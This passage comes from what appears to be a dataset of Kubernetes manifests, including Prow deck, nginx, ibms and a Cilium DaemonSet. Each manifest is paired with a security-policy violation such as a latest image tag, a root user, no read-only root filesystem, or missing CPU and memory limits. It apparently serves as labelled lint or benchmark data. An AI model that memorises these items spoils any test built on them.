mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "03968",
    "manifest_path": "data/manifests/the_stack_sample/sample_1786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201015-deb1bd1036\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "03969",
    "manifest_path": "data/manifests/the_stack_sample/sample_1786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201015-deb1bd1036\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "03970",
    "manifest_path": "data/manifests/the_stack_sample/sample_1786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201015-deb1bd1036\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "03971",
    "manifest_path": "data/manifests/the_stack_sample/sample_1788.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx\nspec:\n  selector:\n    matchLabels:\n      run: my-nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"my-nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03972",
    "manifest_path": "data/manifests/the_stack_sample/sample_1788.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx\nspec:\n  selector:\n    matchLabels:\n      run: my-nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-nginx\" does not have a read-only root file system"
  },
  {
    "id": "03973",
    "manifest_path": "data/manifests/the_stack_sample/sample_1788.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx\nspec:\n  selector:\n    matchLabels:\n      run: my-nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03974",
    "manifest_path": "data/manifests/the_stack_sample/sample_1788.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx\nspec:\n  selector:\n    matchLabels:\n      run: my-nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-nginx\" has cpu request 0"
  },
  {
    "id": "03975",
    "manifest_path": "data/manifests/the_stack_sample/sample_1788.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx\nspec:\n  selector:\n    matchLabels:\n      run: my-nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"my-nginx\" has memory limit 0"
  },
  {
    "id": "03976",
    "manifest_path": "data/manifests/the_stack_sample/sample_1791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ibms-deployment\n  labels:\n    app: ibms-uat\nspec:\n  selector:\n    matchLabels:\n      app: ibms-uat\n  template:\n    metadata:\n      labels:\n        app: ibms-uat\n    spec:\n      containers:\n      - name: ibms\n        image: ghcr.io/dbca-wa/ibms:latest\n        imagePullPolicy: Always\n        env:\n        - name: IBMS_URL\n          value: https://ibms-uat.dbca.wa.gov.au\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: DATABASE_URL\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: SECRET_KEY\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ibms\" is using an invalid container image, \"ghcr.io/dbca-wa/ibms:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03977",
    "manifest_path": "data/manifests/the_stack_sample/sample_1791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ibms-deployment\n  labels:\n    app: ibms-uat\nspec:\n  selector:\n    matchLabels:\n      app: ibms-uat\n  template:\n    metadata:\n      labels:\n        app: ibms-uat\n    spec:\n      containers:\n      - name: ibms\n        image: ghcr.io/dbca-wa/ibms:latest\n        imagePullPolicy: Always\n        env:\n        - name: IBMS_URL\n          value: https://ibms-uat.dbca.wa.gov.au\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: DATABASE_URL\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: SECRET_KEY\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ibms\" does not have a read-only root file system"
  },
  {
    "id": "03978",
    "manifest_path": "data/manifests/the_stack_sample/sample_1791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ibms-deployment\n  labels:\n    app: ibms-uat\nspec:\n  selector:\n    matchLabels:\n      app: ibms-uat\n  template:\n    metadata:\n      labels:\n        app: ibms-uat\n    spec:\n      containers:\n      - name: ibms\n        image: ghcr.io/dbca-wa/ibms:latest\n        imagePullPolicy: Always\n        env:\n        - name: IBMS_URL\n          value: https://ibms-uat.dbca.wa.gov.au\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: DATABASE_URL\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: SECRET_KEY\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ibms\" is not set to runAsNonRoot"
  },
  {
    "id": "03979",
    "manifest_path": "data/manifests/the_stack_sample/sample_1791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ibms-deployment\n  labels:\n    app: ibms-uat\nspec:\n  selector:\n    matchLabels:\n      app: ibms-uat\n  template:\n    metadata:\n      labels:\n        app: ibms-uat\n    spec:\n      containers:\n      - name: ibms\n        image: ghcr.io/dbca-wa/ibms:latest\n        imagePullPolicy: Always\n        env:\n        - name: IBMS_URL\n          value: https://ibms-uat.dbca.wa.gov.au\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: DATABASE_URL\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: SECRET_KEY\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ibms\" has cpu request 0"
  },
  {
    "id": "03980",
    "manifest_path": "data/manifests/the_stack_sample/sample_1791.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ibms-deployment\n  labels:\n    app: ibms-uat\nspec:\n  selector:\n    matchLabels:\n      app: ibms-uat\n  template:\n    metadata:\n      labels:\n        app: ibms-uat\n    spec:\n      containers:\n      - name: ibms\n        image: ghcr.io/dbca-wa/ibms:latest\n        imagePullPolicy: Always\n        env:\n        - name: IBMS_URL\n          value: https://ibms-uat.dbca.wa.gov.au\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: DATABASE_URL\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ibms-env-uat\n              key: SECRET_KEY\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ibms\" has memory limit 0"
  },
  {
    "id": "03981",
    "manifest_path": "data/manifests/the_stack_sample/sample_1792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3123\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03982",
    "manifest_path": "data/manifests/the_stack_sample/sample_1792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3123\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03983",
    "manifest_path": "data/manifests/the_stack_sample/sample_1792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3123\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03984",
    "manifest_path": "data/manifests/the_stack_sample/sample_1792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3123\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03985",
    "manifest_path": "data/manifests/the_stack_sample/sample_1792.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3123\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03986",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cilium-agent\" is using an invalid container image, \"docker.io/cilium/cilium:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03987",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cilium-agent\" does not have a read-only root file system"
  },
  {
    "id": "03988",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: 